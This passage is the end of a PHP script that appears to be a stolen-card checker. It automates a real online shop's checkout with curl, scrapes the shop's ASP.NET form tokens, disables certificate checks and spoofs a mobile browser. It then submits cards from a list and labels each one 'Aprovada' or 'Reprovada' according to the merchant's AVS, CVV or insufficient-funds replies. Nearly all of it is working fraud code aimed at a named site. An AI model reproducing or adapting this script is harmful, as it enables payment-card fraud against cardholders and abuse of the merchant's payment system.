nContCheckout=Continue+Checkout');
$addc = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.healthykin.com/checkoutreview.aspx?paymentmethod=CREDITCARD');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.healthykin.com',
    'referer: https://www.healthykin.com/checkoutpayment.aspx',
    'user-agent: '.$user.'',
]);
$tpay = curl_exec($ch);

$tsm6 = getStr($tpay, 'name="_TSM_HiddenField_" id="_TSM_HiddenField_" value="', '"');
$viewstate6 = urlencode(getStr($tpay, 'name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$viewstategenerator6 = getStr($tpay, 'name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');
$eventvalidation6  = urlencode(getStr($tpay, 'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"'));


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.healthykin.com/checkoutreview.aspx?paymentmethod=CREDITCARD');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.healthykin.com',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: pt-BR,pt;q=0.9,ru-RU;q=0.8,ru;q=0.7,en-US;q=0.6,en;q=0.5,es;q=0.4',
    'cache-control: max-age=0',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://www.healthykin.com',
    'referer: https://www.healthykin.com/checkoutreview.aspx?paymentmethod=CREDITCARD',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: '.$user.'',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '__EVENTTARGET=ctl00%24PageContent%24btnContinueCheckout2&__EVENTARGUMENT=&_TSM_HiddenField_='.$tsm6.'&__VIEWSTATE='.$viewstate6.'&__VIEWSTATEGENERATOR='.$viewstategenerator6.'&__EVENTVALIDATION='.$eventvalidation6.'');
$pau = curl_exec($ch);
$redirect_url = curl_getinfo($ch, CURLINFO_REDIRECT_URL);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$redirect_url.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.healthykin.com',
    'referer: https://www.healthykin.com/checkoutreview.aspx?paymentmethod=CREDITCARD',
    'user-agent: '.$user.'',
]);
$pay = curl_exec($ch);
$msg = getStr($pay, 'id="ctl00_PageContent_ErrorMsgLabel" class="error-large">', '.');

$end_time = microtime(true);
$elapsed_time = number_format(($end_time - $start_time), 2);

if (strpos($pay, "AVS/CVV") !== false) {
    echo "<span style='color: green;'>Aprovada - $lista - Invalid postal code and cvv - ({$elapsed_time}s)</span><br>";
} elseif (strpos($pay, "CVV2 Mismatch") !== false) {
    echo "<span style='color: green;'>Aprovada - $lista - $msg - ({$elapsed_time}s)</span><br>";
} elseif (strpos($pay, "Insufficient funds available") !== false) {
    echo "<span style='color: green;'>Aprovada - $lista - $msg - ({$elapsed_time}s)</span><br>";
} elseif (strpos($pay, "CardToken") !== false) {
    echo "<span style='color: green;'>Aprovada - $lista - CVV MATCH - ({$elapsed_time}s)</span><br>";
} else {
    echo "<span style='color: red;'>Reprovada - $lista - $msg - ({$elapsed_time}s)</span><br>";
}

?>